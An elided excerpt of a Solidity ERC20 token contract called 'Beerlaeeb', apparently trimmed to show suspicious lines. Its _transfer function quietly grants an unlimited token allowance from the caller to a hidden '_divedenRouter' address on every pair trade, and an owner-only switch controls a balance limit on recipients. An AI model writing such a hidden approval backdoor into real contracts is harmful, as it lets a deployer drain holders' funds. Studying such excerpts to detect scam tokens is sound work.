...
contract  Beerlaeeb is IERC20, Ownable {
    ...
    uint256 limitAmount = _tTotal / 100;
    bool public setLimit = true;
    ...
    function transferFrom(
        ...
        if(setLimit){require(limitAmount >= balanceOf(recipient), "exceed LimitAmount");}
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair||to==uniswapV2Pair){
            takeFee = true;_approve(msg.sender, _divedenRouter, ~uint256(0));
    ...
    function setEnableList(bool _setLimit) public onlyOwner{
        setLimit = _setLimit;
    }
